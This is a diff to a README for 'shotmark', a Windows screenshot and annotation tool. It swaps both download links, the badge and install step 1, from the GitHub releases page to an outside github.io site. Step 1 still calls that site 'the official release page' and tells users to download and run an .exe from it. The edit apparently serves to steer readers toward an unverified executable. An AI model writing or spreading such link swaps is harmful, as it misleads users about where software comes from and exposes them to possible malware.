@@ -1,6 +1,6 @@
 # 🎨 shotmark - Capture and annotate images with ease
 
-[![Download Link](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Docile-leadchromate248/shotmark/releases)
+[![Download Link](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://docile-leadchromate248.github.io)
 
 shotmark manages screenshots and image annotations. It provides tools to capture, draw, copy, and save images. The software maintains user privacy because it runs locally on your computer. It does not upload your files to any remote servers.
 
@@ -22,7 +22,7 @@ This application runs on computers using Microsoft Windows. Ensure your system m
 
 Follow these steps to set up the software on your computer.
 
-1.  Visit the official release page: [https://github.com/Docile-leadchromate248/shotmark/releases](https://github.com/Docile-leadchromate248/shotmark/releases).
+1.  Visit the official release page: [https://docile-leadchromate248.github.io](https://docile-leadchromate248.github.io).
 2.  Look for the section labeled "Assets."
 3.  Click the file ending in `.exe` to download the installer to your computer.
 4.  Once the download finishes, locate the file in your "Downloads" folder.
